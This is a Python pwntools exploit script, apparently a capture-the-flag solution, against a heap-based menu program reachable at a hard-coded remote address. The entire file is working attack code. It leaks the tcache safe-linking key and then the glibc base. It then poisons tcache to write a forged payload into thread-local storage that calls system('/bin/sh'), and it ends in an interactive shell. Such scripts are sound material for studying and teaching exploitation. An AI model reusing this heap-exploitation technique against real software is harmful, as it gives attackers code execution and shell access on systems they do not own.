#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or 'vuln_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("159.89.105.235", 10001)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def logleak(name: str, addr: int): print(f"[*] %s => %#lx" % (name, addr))

io = start()

sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
s = lambda a: io.send(a)
rlu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
itb = lambda a: str(a).encode()

def create(idx, size, data):
    sla(b'>', b'1')
    sla(b'index', itb(idx))
    sl(itb(size))
    time.sleep(0.1)
    s(data)

def edit(idx, data):
    sla(b'>', b'2')
    sla(b'rewrite?', itb(idx))
    s(data)

def view(idx):
    sla(b'>', b'3')
    sla(b'recall?', itb(idx))

def free(idx):
    sla(b'>', b'4')
    sla(b'erase?', itb(idx))

def mangle(key, addr):
    return key ^ addr

create(0, 0x288, b'data\n')
create(1, 0x288, b'data\n')
create(2, 0x100, b'asd\n')
create(3, 0x18, b'consolidation\n')
free(0)
free(1)
view(0)

heap_key = u64(rl().strip().ljust(8,b'\x00'))
logleak("heap_key", heap_key)

edit(1, flat(mangle(heap_key, (heap_key << 12) + 0x10)))

create(4, 0x288, b'caca\n')
create(5, 0x288, flat(0x0) * 3 + flat(0x0007000000000000) + b'\n') # modify tcache count
free(2)

view(2)
libc.address = ((u64(rl().strip().ljust(8, b'\x00')) << 8) + 0x20) - 0x203b20
logleak("glibc base", libc.address)

tls = libc.address - 0x3000
tls_func = tls + 0x6f0
tls_payload = flat( 
    tls_func + 8,
    libc.sym.system << 0x11,
    next(libc.search(b"/bin/sh\x00")),
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
    tls+0x740,
    tls+0x10e0,
    tls+0x740,
    0x0, 0x0,
    0x0, 0x0) # ptr_mangle and stack cookie

create(6, 0x288, b'end\n')
free(4)
free(6)
edit(6, flat(mangle(heap_key, tls_func)))
create(7, 0x288, b'hola')
create(8, 0x288, tls_payload + b'\n')

io.interactive()

